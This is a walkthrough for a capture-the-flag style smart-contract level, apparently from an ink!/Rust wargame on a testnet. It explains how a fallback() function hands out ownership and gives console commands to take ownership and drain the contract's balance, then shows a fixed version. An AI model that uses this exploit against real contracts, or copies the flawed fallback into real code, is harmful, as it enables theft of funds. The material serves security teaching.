# Walkthrough: Fallback

> **Difficulty:** Medium
> **Skills:** Fallback functions, Ownership patterns
> **Objective:** Claim ownership of the contract and reduce its balance to 0.

---

## Overview

This contract has an owner who started with a massive contribution of 1000 tokens. The `contribute()` function only allows contributions smaller than 0.001 tokens per call, making it practically impossible to outcontribute the owner through the intended path.

However, there's a backdoor: the `fallback()` function grants instant ownership to anyone who has made any contribution and sends value along with the call.

---

## Prerequisites

- Connected wallet on Paseo Asset Hub testnet with some PAS tokens
- Browser developer console open (F12)
- A deployed instance of this level (click "Get Instance")

---

## Step 1: Analyze the Contract

Look at the ownership transfer logic. There are **two paths** to becoming the owner:

**Path 1 (intended, impractical):** Outcontribute the owner via `contribute()`:
```rust
pub fn contribute(&mut self) {
    let value = self.env().transferred_value().low_u128();
    assert!(value < 1_000_000_000, "Contribution too large");
    // ...
    if self.contributions.get(caller).unwrap_or(0)
       > self.contributions.get(self.owner).unwrap_or(0) {
        self.owner = caller;
    }
}
```
The owner has 1,000,000,000,000,000 units (1000 tokens), and you can only send < 1,000,000,000 (< 0.001 tokens) per call. You'd need over a million transactions.

**Path 2 (the vulnerability):** The `fallback()` function:
```rust
pub fn fallback(&mut self) {
    let value = self.env().transferred_value().low_u128();
    assert!(value > 0, "Must send value");
    assert!(self.contributions.get(caller).unwrap_or(0) > 0,
            "Must have contributed first");
    // Instant ownership!
    self.owner = caller;
}
```

---

## Step 2: Identify the Vulnerability

The `fallback()` function has only two requirements:
1. Send some value (any amount > 0)
2. Have a non-zero contribution

It then sets `self.owner = caller` with **no further checks**. This is a backdoor to ownership that bypasses the contribution-based system entirely.

---

## Step 3: Execute the Exploit

Open your browser console and run these commands in order:

**3a. Make a small contribution (to satisfy the requirement):**

```javascript
await contract.contribute({ value: toUnit(0.0001) })
```

**3b. Call fallback to become the owner:**

```javascript
await contract.fallback({ value: toUnit(0.0001) })
```

**3c. Verify you're the owner:**

```javascript
await contract.getOwner()
// Should return your address
```

**3d. Drain the contract:**

```javascript
await contract.withdraw()
```

**3e. Verify the level is cleared:**

```javascript
await contract.getCleared()
// Should return: true
```

---

## Step 4: Submit

Click the **Submit Instance** button. The factory checks that `cleared == true`.

---

## Why This Works

The contract has **two independent code paths** to the same critical operation (ownership transfer). While the intended path (`contribute()`) has strong restrictions, the `fallback()` function provides an unrestricted shortcut. This is a common pattern in real-world vulnerabilities: developers focus on securing the "main" path but forget about alternative entry points.

---

## How to Prevent This

```rust
// Single, controlled ownership transfer function
#[ink(message)]
pub fn transfer_ownership(&mut self, new_owner: Address) {
    assert_eq!(self.env().caller(), self.owner, "Only owner");
    self.owner = new_owner;
}

// Fallback should NEVER contain privileged logic
#[ink(message, payable)]
pub fn fallback(&mut self) {
    // Only accept and record the payment, nothing else
    let caller = self.env().caller();
    let value = self.env().transferred_value().low_u128();
    let current = self.contributions.get(caller).unwrap_or(0);
    self.contributions.insert(caller, &(current + value));
}
```

- Keep critical operations in a **single function** with proper access control
- Fallback functions should be minimal — only accept funds or reject calls
- Apply the principle of least privilege to every code path
